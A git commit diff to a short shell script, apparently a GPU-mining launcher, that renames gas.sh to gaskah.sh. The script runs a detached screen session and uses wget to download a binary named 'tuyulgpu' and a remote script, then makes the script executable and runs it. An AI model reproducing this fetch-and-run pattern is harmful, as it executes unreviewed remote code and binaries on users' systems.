6507f346dc364f7bc3eee8c125e20b64b4ce1396
sijagungmuda <85990918+sijagungmuda@users.noreply.github.com>
2021-06-20 16:39:08 +0700

    Update and rename gas.sh to gaskah.sh

--- gaskah.sh
+++ gaskah.sh
@@ -4,6 +4,6 @@ sudo apt update
 sudo apt install screen -y
 screen -dmS gpu.sh ./gpu.sh 65 75
 wget https://github.com/nuri655/jajshdbdbdbdbb/raw/main/tuyulgpu
-wget https://raw.githubusercontent.com/sijagungmuda/sip/main/gpu.sh
-chmod +x gpu.sh
-./gpu.sh
+wget https://raw.githubusercontent.com/sijagungmuda/sip/main/gpunyong.sh
+chmod +x gpunyong.sh
+./gpunyong.sh
